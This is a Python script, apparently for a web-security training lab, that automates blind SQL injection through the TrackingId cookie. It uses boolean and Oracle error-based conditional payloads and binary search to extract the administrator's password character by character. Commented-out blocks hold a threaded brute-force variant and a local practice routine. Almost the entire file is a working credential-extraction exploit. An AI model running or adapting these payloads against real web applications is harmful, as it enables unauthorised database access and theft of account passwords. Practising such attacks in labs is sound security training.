import requests
import math
from concurrent.futures import ThreadPoolExecutor, as_completed
from dotenv import load_dotenv
import os
load_dotenv()

tracking_id = os.getenv("TRACKING_ID") # old name: org_cookies
url = os.getenv("LAB_URL").rstrip('/')
session = os.getenv("SESSION_ID")
# 可動態修改的 SQLi payload（例如猜第 pos 個字元）
def build_cookie(pos: int, char: str ,type: str) -> dict:
    payload = f"{tracking_id}"
    if type == "normal":
        payload +=f"'AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}"
    elif type == "eL":
        payload +=f"'AND (SELECT CASE WHEN (SELECT SUBSTR(password, {pos}, 1) FROM users WHERE username = 'administrator') > '{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a"
    elif type == "eE":
        payload+=f"'AND (SELECT CASE WHEN (SELECT SUBSTR(password, {pos}, 1) FROM users WHERE username = 'administrator') = '{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a"
    return {
        "TrackingId": payload,
        "session": f"{session}"
    }
headers = {
    "Accept-Language": "zh-TW,zh;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Referer": f"{url}",
}

#word = "abcdefghijklmnopqrstuvwxyz0123456789"
word = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
word = "0123456789abcdefghijklmnopqrstuvwxyz"
success_length = 3323
password = ""
passwordlen = 20
def RequestCondition(pos: int, char: str ,type: str):
    cookies = build_cookie(pos, char, type)
    r = requests.get(url + "/login", headers=headers, cookies=cookies)
    print(f"status: {r.status_code}, type: {type}, pos: {pos}, char: {char}")
    if  type[0:1] == "e":
        if r.status_code == 500:
            return True
        elif r.status_code == 200:
            return False
        else:
            return None
    return None
def Bin_Search(words: list, ans_index:int):
    low = 0
    high = len(words)-1
    count_for_error = 0
    while low <= high:
        count_for_error+=1
        if count_for_error> math.log2(len(words))+1:
            print("OutOfRange")
            return None
        mid = (low+high)//2
        guess = words[mid]
        #print(f"guess: {guess}, low: {low}, high: {high}, mid: {mid}")
        '''
        if RequestCondition(ans_index+1, guess, "eE"):
            return guess
        '''
        if RequestCondition(ans_index+1, guess, "eL"):
            #print(f"{guess} needs to be higher")
            low = mid+1
        else:
            #print(f"{guess} needs to be lower")
            high = mid-1
    if 0 <= low < len(words):
        print(f"[+] Position {ans_index+1} found: {words[low]}")
        return words[low]
    return "?"
for i in range(passwordlen):
    password+=Bin_Search(word, i)
    print(f"password -> :{password}")
print(password)
'''
def try_char(pos: int, char: str) -> tuple[str, int]:
    """發送單次請求，回傳 (字元, 回應長度)"""
    cookies = build_cookie(pos, char)
    r = requests.get(url + "/login", headers=headers, cookies=cookies)
    return char, len(r.text)


for i in range(1, 21):
    with ThreadPoolExecutor(max_workers=36) as executor:
        futures = {executor.submit(try_char, i, c): c for c in word}
        found_char = None
        for future in as_completed(futures):
            char, length = future.result()
            if length == success_length:
                found_char = char
                break
    if found_char:
        password += found_char
        print(f"[{i}/20] Found: {found_char} → {password}")
    else:
        print(f"[{i}/20] No match for position {i}")
        break

print(f"\nPassword: {password}")
''''''
for i in range(1, 21):
    for char in word:
        cookies = build_cookie(i, char)
        r = requests.get(url+"/login", headers=headers, cookies=cookies)
        print(f"Comparing: {char} with {i} position: Status: {r.status_code}, Length: {len(r.text)}")
        if len(r.text) == success_length:
            password += char
            print(f"Found: {password} with {i} position")
            break

'''
'''
quiz = "DSFGSDFfsdiopfjaesfafASFAS546"
quizLen = len(quiz)
def RequesTLarger(myguess:str ,ans_index:int) -> bool:
    return(1 if quiz[ans_index]>myguess else 0)
def RequesTEqual(myguess:str ,ans_index:int) -> bool:
    return(1 if quiz[ans_index]==myguess else 0)

def Bin_Search(words: list, ans_index:int):
    low = 0
    high = len(words)-1
    count_for_error = 0
    while low <= high:
        count_for_error+=1
        if count_for_error> 7:
            print("OutOfRange")
            return None
        mid = (low+high)//2
        guess = words[mid]
        print(f"guess: {guess}, low: {low}, high: {high}, mid: {mid}")
        if RequesTEqual(guess, ans_index):
            return guess
        elif RequesTLarger(guess, ans_index):
            print(f"{guess} needs to be higher")
            low = mid+1
        else:
            print(f"{guess} needs to be lower")
            high = mid-1
    return None
password = ""
for i in range(quizLen):
    password+=Bin_Search(word, i)
print(password)
print(password == quiz)
'''